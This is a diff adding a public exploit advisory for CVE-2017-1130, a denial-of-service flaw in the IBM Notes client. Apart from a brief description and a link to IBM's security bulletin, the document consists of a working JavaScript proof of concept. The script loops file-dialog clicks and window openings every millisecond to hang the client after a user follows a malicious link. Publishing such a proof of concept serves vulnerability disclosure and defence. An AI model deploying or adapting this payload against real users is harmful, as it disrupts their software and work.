@@ -1,0 +1,42 @@
+# Exploit Title: IBM Notes is affected by a denial of service vulnerability
+# Date: 31 August 2017
+# Software Link: http://www-01.ibm.com/support/docview.wss?uid=swg21999384
+# Exploit Author: Dhiraj Mishra 
+# Contact: http://twitter.com/mishradhiraj_
+# Website: http://datarift.blogspot.in/
+# CVE: CVE-2017-1130
+# Category:  IBM Notes (Console Application)
+ 
+ 
+1. Description
+ 
+IBM Notes is vulnerable to a denial of service involving persuading a user to click on a malicious link, which would ultimately cause the client to have to be restarted. 
+ 
+2. Proof of concept
+ 
+<script>
+var w;
+var wins = {};
+var i = 1;
+f.click();
+setInterval("f.click()", 1);
+setInterval(function(){
+	for (var k in wins) {
+		// after creating window .status = '' (empty string), when the file dialog is displayed its value changes to 'undefined'.
+		if (wins[k] && wins[k].status === undefined) {
+			wins[k].close();
+			delete wins[k];
+		}
+	}
+	w = open('data:text/html,<input type=file id=f><script>f.click();setInterval("f.click()", 1);<\/script>');
+	if (w) {
+		wins[i] = w;
+		i++;
+	}
+}, 1);
+</script>
+ 
+ 
+3. IBM Security Bulletin
+ 
+http://www-01.ibm.com/support/docview.wss?uid=swg21999384
